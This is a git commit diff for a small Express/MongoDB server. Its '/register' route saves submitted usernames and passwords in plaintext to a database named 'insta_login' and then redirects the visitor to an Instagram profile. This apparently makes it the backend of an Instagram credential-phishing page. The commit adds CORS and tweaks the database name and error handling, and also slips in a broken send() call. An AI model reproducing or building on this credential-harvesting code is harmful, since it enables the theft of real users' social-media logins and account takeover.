fbb7eb9bf14808662082fe2ae141683ab1b84d5d
Lalit Gupta <lg989212@gmail.com>
2024-10-30 17:08:15 +0530

    second commit

--- index.js
+++ index.js
@@ -3,6 +3,7 @@ const mongoose = require("mongoose");
 const bodyParser = require("body-parser");
 const dotenv = require("dotenv");
 const path = require("path");
+const cors = require("cors");
 
 const app = express();
 
@@ -11,13 +12,15 @@ dotenv.config();
 const port = process.env.PORT || 3000;
 
 // Middleware to serve static files
+app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true })); // To handle form submissions
+
 
 const username = process.env.MONGODB_USERNAME;
 const password = process.env.MONGODB_PASSWORD;
 
-mongoose.connect(`mongodb+srv://${username}:${password}@cluster0.e1efv.mongodb.net/insta_loginDB`, {
+mongoose.connect(`mongodb+srv://${username}:${password}@cluster0.e1efv.mongodb.net/insta_login`, {
     useNewUrlParser: true,
     useUnifiedTopology: true,
 });
@@ -30,21 +33,21 @@ const registrationSchema = new mongoose.Schema({
 const Registration = mongoose.model("Registration", registrationSchema);
 
 app.get("/", (req, res) => {
-    res.sendFile(path.join(__dirname, "index.html")); // Send HTML file
+    res.sendFile(path.join(__dirname, "index.html")); 
 });
 
 app.post("/register", async (req, res) => {
     try {
         const { username, password } = req.body; // Use 'username' as the field name
         const registrationData = new Registration({
-            name: username, // Store the username
+            name: username, 
             password: password
         });
         await registrationData.save();
         res.redirect("https://www.instagram.com/mahi7781/?hl=en");
     } catch (error) {
         console.log(error);
-        res.status(500).send("Server Error");
+        res.status(500).send("Server Error",error);
     }
 });
 
